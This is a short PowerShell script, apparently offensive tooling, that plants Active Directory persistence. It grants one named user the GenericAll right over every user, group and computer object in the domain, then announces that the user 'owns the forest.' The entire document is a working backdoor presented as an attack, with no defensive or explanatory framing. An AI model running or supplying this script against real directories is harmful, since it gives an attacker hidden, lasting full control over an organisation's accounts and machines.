# Identify the target (The new 'God' user)
$GodUser = Get-ADUser "j.smith"
$UserSID = $GodUser.SID

# Define the 'GenericAll' Right
$Rights = [System.DirectoryServices.ActiveDirectoryRights]"GenericAll"
$Type = [System.Security.AccessControl.AccessControlType]"Allow"
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($UserSID, $Rights, $Type)

# Apply to ALL Users, Groups, and Computers
$ObjectTypes = @("Users", "Groups", "Computers")

foreach ($Type in $ObjectTypes) {
    Write-Host "[*] Granting GenericAll over all $Type..." -ForegroundColor Cyan
    $Objects = Get-ADObject -Filter "ObjectClass -eq '$($Type.Substring(0,$Type.Length-1).ToLower())'"
    
    foreach ($Obj in $Objects) {
        $TargetDN = "AD:\$($Obj.DistinguishedName)"
        $ACL = Get-Acl -Path $TargetDN
        $ACL.AddAccessRule($ACE)
        Set-Acl -Path $TargetDN -AclObject $ACL
    }
}

Write-Host "[!] PERSISTENCE COMPLETE: j.smith owns the forest." -ForegroundColor White -BackgroundColor Red